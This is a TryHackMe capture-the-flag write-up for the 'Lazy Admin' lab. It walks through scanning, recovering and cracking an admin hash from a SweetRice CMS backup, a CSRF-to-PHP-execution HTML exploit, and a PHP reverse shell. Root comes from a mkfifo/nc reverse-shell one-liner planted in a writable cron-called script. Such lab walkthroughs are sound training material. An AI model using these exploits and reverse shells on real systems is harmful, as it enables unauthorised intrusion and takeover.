# Lazy Admin - TryHackMe WriteUp
# By 0xRar



## Scanning
```
nmap -T4 -p- -A -sC -Pn MACHINE_IP
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-22 19:12 EST
Nmap scan report for MACHINE_IP
Host is up (0.15s latency).
Not shown: 65532 closed ports
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp    open     http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- We see that we have port 80 open lets check that out first:
`http://MACHINE_IP` we can see the Apache2 Ubuntu Default Page.


lets check what directories do we have:
```
/

gobuster dir -u MACHINE_IP -w /usr/share/wordlists/dirb/common.txt

/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/content (Status: 301)
/index.html (Status: 200)
/server-status (Status: 403)



/content

gobuster dir -u MACHINE_IP/content -w /usr/share/wordlists/dirb/common.txt

/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/_themes (Status: 301)
/as (Status: 301)
/attachment (Status: 301)
/images (Status: 301)
/inc (Status: 301)
/index.php (Status: 200)
/js (Status: 301)

```

> By taking a look at the source code of the `/content`
> we can see that we have a js linked `http://MACHINE_IP/content/js/SweetRice.js`
> by checking the js file we see that the `cms: SweetRice version is 0.5.4`


## Exploitation

- Now that we have the cms name and version we can search for exploits
```
searchsploit SweetRice
as we can see there is 2 interesting exploits here:
SweetRice 1.5.1 - Backup Disclosure /content/inc/mysql_backup/ (https://www.exploit-db.com/exploits/40718)
SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution (https://www.exploit-db.com/exploits/40700)
```

- After downloading the mysql backup it seems like the file type is php script 
`file mysql_bakup_20191129023059-1.5.1.sql`

- After going through the file and reading the content we can see the username and the passwd:
```
\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\

username : manager

the passwd looks like an md5 hash we can crack it at (https://crackstation.net/)

passwd : Password123
```

- Looking at the directiries we see the login page at `http://MACHINE_IP/content/as/`
- Logging in gave us nothing , so lets check out the other exploit it will allow us to execute code , it means we can get a reverse shell

```
first lets edit our exploit.html , and change the localhost to our MACHINE_IP
and change the location of the login page

<html>
<body onload="document.exploit.submit();">
<form action="http://MACHINE_IP/content/as/?type=ad&mode=save" method="POST" name="exploit">
<input type="hidden" name="adk" value="hacked"/>
<textarea type="hidden" name="adv">
<?php
echo '<h1> Hacked </h1>';
phpinfo();?>
&lt;/textarea&gt;
</form>
</body>
</html>

firefox exploit.html &

Running the exploit.html twice will upload our PoC

going to (http://MACHINE_IP/content/inc/ads/hacked.php), if you can see the phpinfo() page
that means your exploit worked !
```
![PoC](https://user-images.githubusercontent.com/33517160/105569359-1373f500-5d52-11eb-9388-692b956b2a7c.png)


- Now we can use a reverse shell to gain access
```
i use (https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

instead of using this ,
<?php
echo '<h1> Hacked </h1>';
phpinfo();?>

we delete it and paste in our php shell,
 than firefox exploit.html again 
```

- Lets listen via nc `nc -lnvp 4444`
- We can see our shell is uploaded lets run it by going to `/content/inc/ads/shellname.php`


- Lets go get our user flag
```
cd home/itguy
cat user.txt

THM{********************************}    
```


## Privilege Escalation

```
in the itguy dir we see a backup.pl

we see that backup.pl is calling  /etc/copy.sh and copy.sh is writeable for users

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc MACHINE_IP 7777 >/tmp/f
```

- Lets open a new terminal and listen via nc again  `nc -lnvp 7777`

```
now lets run backup.pl so it calls copy.sh than trigger our shell

cd root

cat root.txt

THM{********************************}

```

## This machine is an example for chaining 2 exploits to gain access.
## Thank you for reading 
